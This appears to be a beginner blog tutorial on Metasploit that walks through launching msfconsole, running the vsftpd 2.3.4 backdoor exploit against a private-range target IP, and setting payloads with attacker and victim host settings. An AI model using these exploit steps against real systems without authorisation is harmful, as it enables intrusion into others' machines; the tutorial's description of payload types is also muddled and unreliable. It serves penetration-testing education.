## Introduction

Metasploit is one of the most powerful exploitation tools available for ethical hackers and penetration testers. This versatile framework is available in both commercial and community editions, with no significant differences between the two. In this tutorial, we will primarily use the Community version of Metasploit embedded in Kali Linux. Metasploit can also be installed separately on systems running Linux, Windows, or Mac OS X. This guide will walk you through the basics of using Metasploit, from installation requirements to executing exploits and payloads.

* * *

### Requirements

To install Metasploit, ensure your system meets the following hardware requirements:

- 2 GHz+ processor
- 1 GB available RAM
- 1 GB+ available disk space

Metasploit is primarily used from the terminal. To open it, simply execute the following command:

```html
msfconsole
```

After Metasploit starts, you will see the following screen. Highlighted in yellow is the version of Metasploit.

![Getting Started with Metasploit for Ethical Hacking](https://neoslab.com/uploads/medias/2021/12/getting-started-with-metasploit-for-ethical-hacking-1.png "Getting Started with Metasploit for Ethical Hacking")

* * *

### Exploits of Metasploit

For this example, we will assume that a Vulnerability Scanner has identified a vulnerable FTP service on a Linux machine. We will use the `vsftpd_234_backdoor` exploit to demonstrate how Metasploit works.

First, use the following command:

```html
msf > use exploit/unix/ftp/vsftpd_234_backdoor
```

![Getting Started with Metasploit for Ethical Hacking](https://neoslab.com/uploads/medias/2021/12/getting-started-with-metasploit-for-ethical-hacking-2.png "Getting Started with Metasploit for Ethical Hacking")

Next, type `show options` to see the parameters that need to be set:

```html
msf > show options
```

As shown in the following screenshot, set **RHOST** as the "target IP":

![Getting Started with Metasploit for Ethical Hacking](https://neoslab.com/uploads/medias/2021/12/getting-started-with-metasploit-for-ethical-hacking-3.png "Getting Started with Metasploit for Ethical Hacking")

Set the target IP and port using the following commands:

```html
msf > set RHOST 192.168.1.101
msf > set RPORT 21
```

![Getting Started with Metasploit for Ethical Hacking](https://neoslab.com/uploads/medias/2021/12/getting-started-with-metasploit-for-ethical-hacking-4.png "Getting Started with Metasploit for Ethical Hacking")

Finally, type `run` to execute the exploit. If successful, it will open a session you can interact with:

```html
msf > run
```

* * *

### Metasploit Payloads

Metasploit payloads can be categorized into three types:

- **Singles:** Small payloads designed to create some kind of communication and move to the next stage. For example, creating a user.
- **Staged:** Payloads used to upload a larger file onto a victim system.
- **Stages:** Payload components downloaded by Stagers modules, providing advanced features without size limits, such as Meterpreter and VNC Injection.

Payloads are simple scripts that hackers use to interact with a hacked system. Using payloads, they can transfer data to a victim system.

* * *

### Payload Usage Example

To see available payloads, use the following command:

```html
msf > show payloads
```

To set the desired payload, use:

```html
msf > set PAYLOAD payload/path
```

Set the host and port to listen (LHOST, LPORT), which are the **attacker IP** and **port**. Then, set the remote host and port (RHOST, RPORT), which are the **victim IP** and **port**. When you are ready, simply type `exploit` to create a session if the targeted host is vulnerable to the selected exploit:

```html
msf > exploit
```

* * *

### Conclusion

Metasploit is an invaluable tool for ethical hackers and penetration testers, providing powerful capabilities for exploiting vulnerabilities and deploying payloads. By following the steps outlined in this guide, you can effectively use Metasploit to assess and enhance the security of your systems. Whether you are targeting FTP services, web applications, or other network vulnerabilities, Metasploit offers the flexibility and power to adapt to various scenarios.